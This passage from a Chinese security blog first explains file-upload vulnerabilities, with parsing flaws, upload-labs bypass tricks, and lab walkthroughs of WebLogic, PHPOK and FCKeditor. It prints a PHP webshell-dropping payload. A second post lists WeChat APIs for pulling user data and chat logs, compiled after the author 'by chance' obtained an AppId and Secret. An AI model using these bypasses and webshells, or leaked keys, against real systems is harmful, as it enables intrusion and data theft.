以上有三处被标记的位置，这三处是用来检测点号、反斜杠、分号。、 可以理解为的检测流程为： www.xxx.com/xxx.asp;xxx.jpg N1:从头部查找查找&quot;.&quot;号,获得&quot;.asp;xxxx.jpg&quot; N2:查找&quot;;&quot;号,如果有则内存截断 N3:查找&quot;/&quot;,如果有则内存截断 因此，.asp将最终被保存下来，IIS6只简单地根据扩展名来识别，所以从脚本映射表中里查找脚本与扩展名对比，并利用asp.dll来解析。导致最终的问题产生。 对于此问题，微软并不认为这是一个漏洞，同样也没推出IIS6.0解析漏洞的补丁。因此在IIS6.0的网站下，此问题仍然可以尝试是否存在。 0x05-2、Nginx 解析漏洞​ Nginx是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点开发的。 ​ 在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。为什么是由于PHP-CGI的原因呢，因为在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。 ​ 普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。访问 ”www.xx.com/phpinfo.jpg/1.php” 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了 ​ 在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt; 然后访问xx.jpg/.php,在这个目录下就会生成一句话木马shell.php。同样利用phpstudy说明，上传1.jpg格式的文件，内容为访问phpinfo，如下即可触发： 0x05-3、Apache 解析漏洞​ Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。 ​ Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式： www.xxxx.com/apache.php.bbb.aaa Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件。 ​ 那么为什么会产生此问题原因，在Apache的官方网站上，有一句这么关于“extension”的解释： 地址：http://httpd.apache.org/docs/current/mod/directive-dict.html extension In general, this is the part of the filename which follows the last dot. However, Apache recognizes multiple filename extensions, so if a filename contains more than one dot, each dot-separated part of the filename following the first dot is an extension. For example, the filename file.html.en contains two extensions: .html and .en. For Apache directives, you may specify extensions with or without the leading dot. In addition, extensions are not case sensitive. ​ 通过这个解释可以看出来，Apache允许文件有多个后缀名，并会按照第一个点来分析文件后缀，例如file.html.en。Apache按照每个点来分割后缀名，因此此文件名为.html、.en。由于en后缀不被识别，便继续向前解析。 ​ 另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件mime.types中查找是否出现。 ​ 此处使用phpstudy测试，利用dvwa的文件上传功能，上传1.php.wwe。结果解析如下： 0x06、测试方法对于文件上传漏洞方式和举例此处采用一个文件靶场，地址：https://github.com/c0ny1/upload-labs 以下将利用靶场其中的一部分内容来举例说明文件上传漏洞的产生和效果。 环境：Ubuntu 18、Windows phpStudy (采用不一样的系统，为了在不同系统的差异做演示) WEB容器：Apache 2.0 语言：PHP 抓包工具：Burp Suite Pro 验证工具：Hackbar插件 0x06-1、前端验证此种验证形式在很多网站、CMS都有使用，只在前端利用JS来做效验，采用禁用JS上传、抓包上传都可以绕过此处限制。此处采用抓包演示。 点击上传文件，选择已经改成“.jpg”后缀的后门文件。修改burp中的文件后缀信息。 访问已经上传的文件，利用Hackbar访问phpinfo()。可以看到后门已经得到执行。 0x06-2、.htaccess规则文件绕过​ 在利用.htaccess文件之前，我们先来了解一下什么是.htaccess规则文件。.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。 ​ 概述来说，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 ​ 在一些启用了.htaccess文件的网站上就可以使用此文件类型来绕过限制较全面的黑名单过滤。 ​ 先上传一个.htaccess文件，内容为：AddType application/x-httpd-php .aaa。如下： ​ 然后再上传文件后缀为.aaa的文件，让其解析为php类型文件。 ​ 上传成功后访问此上传文件，访问如下： 0x06-3、文件名后缀大小写混合绕过​ 在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。如下形式： ​ 访问上传成功的文件： 0x06-4、Windows文件流特性绕过​ 在讨论这种特性之前，我们先来认识一下Windows文件流。流文件，即NTFS交换数据流（alternate data streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，它使用资源派生来维持与文件相关的信息。创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。 ​ 详细相关介绍和内容可以查看文章：https://www.freebuf.com/column/143101.html。此处不做深入解释。 上传文件为xxx.php::$DATA类型的文件。可以看到上传的文件为xxx.php::$data。 我们访问的时候就可以直接访问xxx.php文件。 0x06-5、%00截断绕过​ 以上问题被绕过的根本原因是采用了一些有缺陷的黑名单限制，一般采用白名单的限制会减少相当多的绕过问题产生，但是并不意味着一定安全，在某些没有处理严格的程序上，仍然可以采用截断绕过的形式。 首先我们来看这段上传的代码： $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传失败&quot;; } } else { $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。如下上传，显示文件路径中有个空格，这并不是真正意义上的空格，而是%00截断后显示成的空格。 访问上传地址路径： 0x06-5、文件头检测绕过​ 提到文件头检测，我们就先来认识一下常见文件的文件头格式。我们先打开一个正常的JPG图片格式文件，查看文件的文件头十六进制。采用010Editor。 ​ 右边栏中有明显的JFIF存储格式字样，文件头前十个字节为FF D8 FF E0 00 10 4A 46 49 46，其中开头标红的为标记码，FF D8代表SOI标记，意思是图像文件开始值。4A 46 49 46代表字符串JFIF标记。 关于JPEG文件格式介绍可以阅读：https://www.cnblogs.com/sddai/p/5666924.html ​ 然后我们再打开一份PNG文件格式的图片，同样采用010Editor来查看其十六进制。 ​ 对于的开头4字节为右栏中‰PNG字样，PNG的8字节文件署名域用来识别该文件是不是PNG文件。也就是89 50 4E 47 0D 0A 1A 0A。 关于PNG文件格式可以阅读：https://blog.csdn.net/qq_21950929/article/details/79198814 ​ 同样打开一份GIF文件格式图片，用010Editor来打开查看文件。 ​ 文件十六进制中可以看到，其中47 49 46 38 39 61，代表了右栏中的GIF89a，这六个字节作为了GIF文件格式头的开头文件。而在其后的绕过中就采用了GIF89a这个字符串。 关于GIF文件格式可以阅读：https://www.jianshu.com/p/df52f1511cf8 了解过文件格式后，我们来看这个文件格式检测绕过形式，首先查看代码，为了方便演示修改了源代码对文件格式的获取，此处只读取文件的前两个字节值： function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); $fileType = &#39;&#39;; switch($typeCode){ case 255216: $fileType = &#39;jpg&#39;; break; case 13780: $fileType = &#39;png&#39;; break; case 7173: $fileType = &#39;gif&#39;; break; default: $fileType = &#39;unknown&#39;; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_type = getReailFileType($temp_file); if($file_type == &#39;unknown&#39;){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); //此处为了方便演示添加了file_ext 变量 $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } } } 然后上传php文件，修改文件内容，添加文件头GIF89a： 这种添加形式类似于在hex中修改添加： 然后在访问以上传的文件： 0x07、利用工具进行FUZZ​ 很多网站对上传进行拦截的时候采取的是黑名单校验，当我们看到黑名单的时候就可以考虑采取修改后缀、截断等方式尝试绕过。 ​ 我们采用一个工具：https://github.com/c0ny1/upload-fuzz-dic-builder 来生成fuzz的字典。执行命令: python upload-fuzz-dic-builder.py -n test -a jpg -l php -m apache --os win -o upload_file.txt ​ 把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。 访问如图中的地址文件，可以看到上传成功： 0x08、实战演示演示漏洞为：CVE-2018-2894 漏洞环境：Linux Weblogic 12.2 漏洞下载地址：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894 漏洞介绍：WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do。 影响范围为：Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。 下载好vulhub后，进入相应的CVE目录，执行如下命令： docker-compose up -d 等到docker构建结束，会在7001端口开放一个服务，如下所示： 此处需要登陆账号和密码，正常情况下是尝试弱口令进后台上传文件，此处方便演示，从构建日志中查看密码： docker-compose logs | grep password 查看结果： weblogic_1 | ----&gt; &#39;weblogic&#39; admin password: oZUcqr8j weblogic_1 | admin password : [oZUcqr8j] weblogic_1 | * password assigned to an admin-level user. For * 登陆后界面如下： 点击左侧中的base_domain选项，再点击下面的高级选项，从高级中启用web测试页，保存。 然后访问http://192.168.120.132:7001/ws_utc/config.do页面，设置Work Home Dir，可以看到其中已经填写一个目录，此目录访问需要登陆，修改为P牛的建议路径： /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css 原路径为： /u01/oracle/user_projects/domains/base_domain/tmp/WSTestPageWorkDir 在当前页面中选择安全-&gt;增加，上传webshell 然后从放回页面中查看id项时间戳，访问路径/ws_utc/css/config/keystore/时间戳_文件名 然后执行命令whoami: 0x09、CMS实战演示0x09-1、PHPOK 任意文件上传演示漏洞为：phpok 任意文件上传 漏洞环境：Windows phpStudy 漏洞环境下载：https://download.phpok.com/4.8.338.zip 漏洞介绍：phpok 4.8.338版本管理后台存在任意文件上传漏洞，攻击者可利用漏洞上传任意文件，获取网站权限。 下载文件后，把解压的文件放入phpstudy中的www目录中，此处修改了版本号目录为phpok。然后访问本地地址：http://localhost/phpok，会自动进入安装页面，填写数据库密码，创建账号后自动进入安装页面，安装完成后显示如下： 使用一开始创建的账号密码登陆，登陆成功后在后侧的选择栏处选择工具-&gt;附件分类管理。 点击右侧上方的创建资源分类，然后在支持的附件类型中创建php文件类型。 选择左侧的内容管理-&gt;资讯中心-&gt;行业管理 点击页面中的选择图片-&gt;上传附近选择添加的附件类型-&gt;选择php文件上传，上传成功后点击上传的图片，选择预览就可以看到文件目录的地址 访问地址文件后门，可以看到执行代码成功 漏洞修复：此问题在高版本修复，及时升级到高版本处理，目前最新版本为5.2.116。 0x09-2、FCKeditor 2.4.3 文件上传演示漏洞为：FCKeditor 2.4.3 文件上传 漏洞环境：Windows phpStudy 漏洞环境下载：https://github.com/treadmillian/fckeditor.git 漏洞介绍：FCKeditor /fckeditor/editor/filemanager/upload/php/upload.php 文件上传漏洞。 首先从GitHub下载文件，放到phpStudy的www目录中，同时修改config.php文件，修改UserFilesPath参数为fck目录下的地址，修改如下： 文件地址： \\fckeditor\\editor\\filemanager\\browser\\default\\connectors\\php\\config.php 访问地址：http://localhost/fckeditor/editor/filemanager/browser/default/connectors/test.html# 选择文件上传，由于2.4.3在文件配置已经进行了后缀的限制，默认限制为： array(&#39;html&#39;,&#39;htm&#39;,&#39;php&#39;,&#39;php2&#39;,&#39;php3&#39;,&#39;php4&#39;,&#39;php5&#39;,&#39;phtml&#39;,&#39;pwml&#39;,&#39;inc&#39;,&#39;asp&#39;,&#39;aspx&#39;,&#39;ascx&#39;,&#39;jsp&#39;,&#39;cfm&#39;,&#39;cfc&#39;,&#39;pl&#39;,&#39;bat&#39;,&#39;exe&#39;,&#39;com&#39;,&#39;dll&#39;,&#39;vbs&#39;,&#39;js&#39;,&#39;reg&#39;,&#39;cgi&#39;,&#39;htaccess&#39;,&#39;asis&#39;,&#39;sh&#39;,&#39;shtml&#39;,&#39;shtm&#39;,&#39;phtm&#39;) 对于此处漏洞我们采用空格绕过，先上传一个JPG的图片，抓包修改后缀，添加空格如下： 访问上传产生的路径文件，路径会显示在页面中： http://localhost/fckeditor/editor/filemanager/browser/default/connectors/uploads/file/05091707156.php 执行一句话木马文件： 漏洞修复：由于此处使用黑名单校验，可以根据需要的类型修改为白名单参数。 0x10、漏洞修复关于文件上传漏洞的产生和修改此处讨论两种文件上传漏洞的情况和修复： 1、代码未判断文件类型或者文件类型限制不完全，一般这种是黑名单或者没有限制，建议添加白名单限制参数数组，固定为图片或文本格式文件。例如如下： if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传失败&quot;; } } else { $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 2、如果是使用WEB中间件存在上传，或者是CMS存在文件上传漏洞，根据官方建议安装补丁升级版本，或者使用官方推荐的临时修改策略来限制问题的产生和利用。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"微信公众号接口","slug":"微信公众号接口","date":"2019-05-27T03:32:58.000Z","updated":"2019-05-27T03:33:38.075Z","comments":true,"path":"2019/05/微信公众号接口/","link":"","permalink":"/2019/05/微信公众号接口/","excerpt":"","text":"在一个偶然的机会获取到了一对微信AppId与Secret，于是整理了一下常用和有用的微信公众号信息获取的接口，以下是部分微信接口调用示例和说明。 1、平台开发者获取access_tokenaccess_token是公众号的全局唯一接口调用凭据，公众号调用各接口时都需使用access_token。access_token的有效期目前为2个小时，需定时刷新，重复获取将导致上次获取的access_token失效。 a、接口调用请求说明http请求方式: GET https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=APPID&amp;secret=APPSECRET b、参数说明参数 是否必须 说明 grant_type 是 获取access_token填写client_credential appid 是 第三方用户唯一凭证 secret 是 第三方用户唯一凭证密钥，即appsecret c、返回说明微信会返回下述JSON数据包给公众号： {&quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;,&quot;expires_in&quot;:7200} 2、获取微信服务器IP地址如果公众号基于安全等考虑，需要获知微信服务器的IP地址列表，以便进行相关限制，可以通过该接口获得微信服务器IP地址列表或者IP网段信息。 a、接口调用请求说明http请求方式: GET https://api.weixin.qq.com/cgi-bin/getcallbackip?access_token=ACCESS_TOKEN b、参数说明参数 是否必须 说明 access_token 是 公众号的access_token c、返回说明正常情况下，微信会返回下述JSON数据包给公众号： { &quot;ip_list&quot;: [ &quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;, &quot;101.226.103.0/25&quot; ] } 3、自定义菜单查询接口使用接口创建自定义菜单后，开发者还可使用接口查询自定义菜单的结构。另外请注意，在设置了个性化菜单后，使用本自定义菜单查询接口可以获取默认菜单和全部个性化菜单信息。 a、请求说明http请求方式：GET https://api.weixin.qq.com/cgi-bin/menu/get?access_token=ACCESS_TOKEN b、参数说明参数 是否必须 说明 access_token 是 公众号的access_token c、返回说明对应创建接口，正确的Json返回结果: { &quot;menu&quot;: { &quot;button&quot;: [ { &quot;type&quot;: &quot;click&quot;, &quot;name&quot;: &quot;今日歌曲&quot;, &quot;key&quot;: &quot;V1001_TODAY_MUSIC&quot;, &quot;sub_button&quot;: [ ] }, { &quot;name&quot;: &quot;菜单&quot;, &quot;sub_button&quot;: [ { &quot;type&quot;: &quot;view&quot;, &quot;name&quot;: &quot;搜索&quot;, &quot;url&quot;: &quot;http://www.soso.com/&quot;, &quot;sub_button&quot;: [ ] } ] } ] } } 4、自定义菜单删除接口使用接口创建自定义菜单后，开发者还可使用接口删除当前使用的自定义菜单。另请注意，在个性化菜单时，调用此接口会删除默认菜单及全部个性化菜单。 a、请求说明http请求方式：GET https://api.weixin.qq.com/cgi-bin/menu/delete?access_token=ACCESS_TOKEN b、参数说明参数 是否必须 说明 access_token 是 公众号的access_token c、返回说明对应创建接口，正确的Json返回结果: {&quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;} 5、添加客服帐号开发者可以通过本接口为公众号添加客服账号，每个公众号最多添加10个客服账号。 a、接口调用请求http请求方式: POST https://api.weixin.qq.com/customservice/kfaccount/add?access_token=ACCESS_TOKEN b、POST数据示例{ &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;nickname&quot; : &quot;客服1&quot;, &quot;password&quot; : &quot;pswmd5&quot;, } c、返回说明正确时的JSON返回结果 { &quot;errcode&quot; : 0, &quot;errmsg&quot; : &quot;ok&quot;, } 6、获取所有客服账号开发者通过本接口，获取公众号中所设置的客服基本信息，包括客服工号、客服昵称、客服登录账号。 a、接口调用请求http请求方式: GET https://api.weixin.qq.com/cgi-bin/customservice/getkflist?access_token=ACCESS_TOKEN b、返回说明{ &quot;kf_list&quot;: [ { &quot;kf_account&quot;: &quot;test1@test&quot;, &quot;kf_nick&quot;: &quot;ntest1&quot;, &quot;kf_id&quot;: &quot;1001&quot; &quot;kf_headimgurl&quot;: &quot; http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot; }, { &quot;kf_account&quot;: &quot;test2@test&quot;, &quot;kf_nick&quot;: &quot;ntest2&quot;, &quot;kf_id&quot;: &quot;1002&quot; &quot;kf_headimgurl&quot;: &quot; http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw /0&quot; } ] } 7、修改客服帐号开发者可以通过本接口为公众号修改客服账号。 a、接口调用请求http请求方式: POST https://api.weixin.qq.com/customservice/kfaccount/update?access_token=ACCESS_TOKEN b、POST数据示例{ &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;nickname&quot; : &quot;客服1&quot;, &quot;password&quot; : &quot;pswmd5&quot;, } c、返回说明正确时的JSON返回结果 { &quot;errcode&quot; : 0, &quot;errmsg&quot; : &quot;ok&quot;, } 8、删除客服帐号开发者可以通过该接口为公众号删除客服帐号。 a、接口调用请求http请求方式: GET https://api.weixin.qq.com/customservice/kfaccount/del?access_token=ACCESS_TOKEN b、POST数据示例{ &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;nickname&quot; : &quot;客服1&quot;, &quot;password&quot; : &quot;pswmd5&quot;, } c、返回说明正确时的JSON返回结果 { &quot;errcode&quot; : 0, &quot;errmsg&quot; : &quot;ok&quot;, } 9、用户授权登陆第三方应用第三方使用网站应用授权登录前请注意已获取相应网页授权作用域（scope=snsapi_login）。 第一步https://open.weixin.qq.com/connect/qrconnect?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=code&amp;scope=SCOPE&amp;state=STATE#wechat_redirect 参数说明参数 是否必须 说明 appid 是 应用唯一标识 redirect_uri 是 请使用urlEncode对链接进行处理 response_type 是 填code scope 是 应用授权作用域，拥有多个作用域用逗号（,）分隔，网页应用目前仅填写snsapi_login即 state 否 用于保持请求和回调的状态，授权请求后原样带回给第三方。该参数可用于防止csrf攻击（跨站请求伪造攻击），建议第三方带上该参数，可设置为简单的随机数加session进行校验 返回说明用户允许授权后，将会重定向到redirect_uri的网址上，并且带上code和state参数 redirect_uri?code=CODE&amp;state=STATE 第二步通过code获取access_token https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code 参数说明参数 是否必须 说明 appid 是 应用唯一标识，在微信开放平台提交应用审核通过后获得 secret 是 应用密钥AppSecret，在微信开放平台提交应用审核通过后获得 code 是 填写第一步获取的code参数 grant_type 是 填authorization_code 返回说明正确的返回： { &quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;, &quot;expires_in&quot;:7200, &quot;refresh_token&quot;:&quot;REFRESH_TOKEN&quot;, &quot;openid&quot;:&quot;OPENID&quot;, &quot;scope&quot;:&quot;SCOPE&quot;, &quot;unionid&quot;: &quot;o6_bmasdasdsad6_2sgVt7hMZOPfL&quot; } 第三步获取access_token后，进行接口调用，有以下前提： 1. access_token有效且未超时； 2. 微信用户已授权给第三方应用帐号相应接口作用域（scope）。 接口作用域（scope），能调用的接口有以下其中snsapi_base属于基础接口，若应用已拥有其它scope权限，则默认拥有snsapi_base的权限。 授权作用域（scope） 接口 接口说明 snsapi_base /sns/oauth2/access_token 通过code换取access_token、refresh_token和已授权scope snsapi_base /sns/oauth2/refresh_token 刷新或续期access_token使用 snsapi_base /sns/auth 检查access_token有效性 snsapi_userinfo /sns/userinfo 获取用户个人信息 拉取用户信息(需scope为 snsapi_userinfo)http：GET https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN 参数说明参数 描述 access_token 网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同 openid 用户的唯一标识 lang 返回国家地区语言版本，zh_CN 简体，zh_TW 繁体，en 英语 返回说明正确时返回的JSON数据包如下： {&quot;openid&quot;:&quot; OPENID&quot;, &quot; nickname&quot;: NICKNAME, &quot;sex&quot;:&quot;1&quot;, &quot;province&quot;:&quot;PROVINCE&quot; &quot;city&quot;:&quot;CITY&quot;, &quot;country&quot;:&quot;COUNTRY&quot;, &quot;headimgurl&quot;: &quot;http://wx.qlogo.cn/mmopen/g3MonUZtNHkdmzicIlibx6iaFqAc56vxLSUfpb6n5WKSYVY0ChQKkiaJSgQ1dZuTOgvLLrhJbERQQ4eMsv84eavHiaiceqxibJxCfHe/46&quot;, &quot;privilege&quot;:[ &quot;PRIVILEGE1&quot; &quot;PRIVILEGE2&quot; ], &quot;unionid&quot;: &quot;o6_bmasdasdsad6_2sgVt7hMZOPfL&quot; } 检验授权凭证（access_token）是否有效http：GET https://api.weixin.qq.com/sns/auth?access_token=ACCESS_TOKEN&amp;openid=OPENID 参数说明参数 描述 access_token 网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同 openid 用户的唯一标识 返回说明正确的JSON返回结果： { &quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;} 错误时的JSON返回示例： { &quot;errcode&quot;:40003,&quot;errmsg&quot;:&quot;invalid openid&quot;} 10、批量获取用户基本信息请求说明http请求方式: POST https://api.weixin.qq.com/cgi-bin/user/info/batchget?access_token=ACCESS_TOKEN POST数据示例{ &quot;user_list&quot;: [ { &quot;openid&quot;: &quot;otvxTs4dckWG7imySrJd6jSi0CWE&quot;, &quot;lang&quot;: &quot;zh-CN&quot; }, { &quot;openid&quot;: &quot;otvxTs_JZ6SEiP0imdhpi50fuSZg&quot;, &quot;lang&quot;: &quot;zh-CN&quot; } ] } 返回说明{ &quot;user_info_list&quot;: [ { &quot;subscribe&quot;: 1, &quot;openid&quot;: &quot;otvxTs4dckWG7imySrJd6jSi0CWE&quot;, &quot;nickname&quot;: &quot;iWithery&quot;, &quot;sex&quot;: 1, &quot;language&quot;: &quot;zh_CN&quot;, &quot;city&quot;: &quot;Jieyang&quot;, &quot;province&quot;: &quot;Guangdong&quot;, &quot;country&quot;: &quot;China&quot;, &quot;headimgurl&quot;: &quot;http://wx.qlogo.cn/mmopen/xbIQx1GRqdvyqkMMhEaGOX802l1CyqMJNgUzKP8MeAeHFicRDSnZH7FY4XB7p8XHXIf6uJA2SCun TPicGKezDC4saKISzRj3nz/0&quot;, &quot;subscribe_time&quot;: 1434093047, &quot;unionid&quot;: &quot;oR5GjjgEhCMJFyzaVZdrxZ2zRRF4&quot;, &quot;remark&quot;: &quot;&quot;, &quot;groupid&quot;: 0, &quot;tagid_list&quot;:[128,2] }, { &quot;subscribe&quot;: 0, &quot;openid&quot;: &quot;otvxTs_JZ6SEiP0imdhpi50fuSZg&quot;, &quot;unionid&quot;: &quot;oR5GjjjrbqBZbrnPwwmSxFukE41U&quot;, } ] } 11、获取微信公众号用户列表调用请求说明http请求方式: GET（请使用https协议） https://api.weixin.qq.com/cgi-bin/user/get?access_token=ACCESS_TOKEN&amp;next_openid=NEXT_OPENID 参数说明参数 是否必须 说明 access_token 是 调用接口凭证 next_openid 是 第一个拉取的OPENID，不填默认从头开始拉取 返回说明正确时返回JSON数据包： {&quot;total&quot;:2,&quot;count&quot;:2,&quot;data&quot;:{&quot;openid&quot;:[&quot;&quot;,&quot;OPENID1&quot;,&quot;OPENID2&quot;]},&quot;next_openid&quot;:&quot;NEXT_OPENID&quot;} 参数说明参数 说明 total 关注该公众账号的总用户数 count 拉取的OPENID个数，最大值为10000 data 列表数据，OPENID的列表 next_openid 拉取列表的最后一个用户的OPENID 12、企业新版微信客服获取客服基本信息http请求方式: GET https://api.weixin.qq.com/cgi-bin/customservice/getkflist?access_token=ACCESS_TOKEN 返回说明返回数据示例（正确时的JSON返回结果）： { &quot;kf_list&quot; : [ { &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;kf_headimgurl&quot; : &quot;http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot;, &quot;kf_id&quot; : &quot;1001&quot;, &quot;kf_nick&quot; : &quot;ntest1&quot;, &quot;kf_wx&quot; : &quot;kfwx1&quot; }, { &quot;kf_account&quot; : &quot;test3@test&quot;, &quot;kf_headimgurl&quot; : &quot;http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot;, &quot;kf_id&quot; : &quot;1003&quot;, &quot;kf_nick&quot; : &quot;ntest3&quot;, &quot;invite_wx&quot; : &quot;kfwx3&quot;, &quot;invite_expire_time&quot; : 123456789, &quot;invite_status&quot; : &quot;waiting&quot; } ] } 参数说明参数 说明 kf_account 完整客服帐号，格式为：帐号前缀@公众号微信号 kf_nick 客服昵称 kf_id 客服编号 kf_headimgurl 客服头像 kf_wx 如果客服帐号已绑定了客服人员微信号，则此处显示微信号 invite_wx 如果客服帐号尚未绑定微信号，但是已经发起了一个绑定邀请，则此处显示绑定邀请的微信号 invite_expire_time 如果客服帐号尚未绑定微信号，但是已经发起过一个绑定邀请，邀请的过期时间，为unix 时间戳 invite_status 邀请的状态，有等待确认“waiting”，被拒绝“rejected”，过期“expired” 13、获取聊天记录调用说明http请求方式: POST https://api.weixin.qq.com/customservice/msgrecord/getmsglist?access_token=ACCESS_TOKEN POST数据示例如下： { &quot;starttime&quot; : 987654321, &quot;endtime&quot; : 987654321, &quot;msgid&quot; : 1, &quot;number&quot; : 10000 } 参数说明参数 说明 starttime 起始时间，unix时间戳 endtime 结束时间，unix时间戳，每次查询时段不能超过24小时 msgid 消息id顺序从小到大，从1开始 number 每次获取条数，最多10000条 返回说明{ &quot;recordlist&quot; : [ { &quot;openid&quot; : &quot;oDF3iY9WMaswOPWjCIp_f3Bnpljk&quot;, &quot;opercode&quot; : 2002, &quot;text&quot; : &quot; 您好，客服test1为您服务。&quot;, &quot;time&quot; : 1400563710, &quot;worker&quot; : 